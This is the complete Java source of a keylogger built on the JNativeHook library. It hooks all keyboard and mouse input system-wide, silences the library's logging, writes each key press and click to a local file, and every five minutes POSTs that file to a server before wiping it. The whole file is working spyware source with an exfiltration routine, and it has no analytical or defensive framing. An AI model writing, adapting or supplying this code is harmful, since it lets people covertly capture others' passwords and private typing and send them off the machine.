import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseListener;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Timer;
import java.util.TimerTask;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Keylogger implements NativeKeyListener, NativeMouseListener {
    private static final String LOG_FILE_PATH = "keystrokes.log";
    private static final int SEND_INTERVAL = 5 * 60 * 1000; // 5 minutes

    public Keylogger() {
        try {
            Files.write(Paths.get(LOG_FILE_PATH), "".getBytes());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        logToFile("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    @Override
    public void nativeMouseClicked(NativeMouseEvent e) {
        logToFile("Mouse Clicked at: " + e.getX() + ", " + e.getY());
    }

    private void logToFile(String data) {
        try (FileWriter fw = new FileWriter(LOG_FILE_PATH, true);
             BufferedWriter bw = new BufferedWriter(fw)) {
            bw.write(data);
            bw.newLine();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void sendDataToServer() {
        while (true) {
            try {
                Thread.sleep(SEND_INTERVAL);
                File logFile = new File(LOG_FILE_PATH);
                if (!logFile.exists()) continue;
                try (FileInputStream fis = new FileInputStream(logFile)) {
                    byte[] data = new byte[(int) logFile.length()];
                    fis.read(data);
                    URL url = new URL("http://localhost:8080");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    try (OutputStream os = conn.getOutputStream()) {
                        os.write(data);
                        os.flush();
                    }
                    Files.write(Paths.get(LOG_FILE_PATH), "".getBytes());
                    System.out.println("Data sent to server. Response: " + conn.getResponseCode());
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private void scheduleDataSending() {
        Timer timer = new Timer();
        TimerTask task = new TimerTask() {
            @Override
            public void run() {
                sendDataToServer();
            }
        };
        timer.schedule(task, SEND_INTERVAL, SEND_INTERVAL);
    }

    public static void main(String[] args) {
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            ex.printStackTrace();
            System.exit(1);
        }
        Keylogger keylogger = new Keylogger();
        GlobalScreen.addNativeKeyListener(keylogger);
        GlobalScreen.addNativeMouseListener(keylogger);
        keylogger.scheduleDataSending();
    }
}
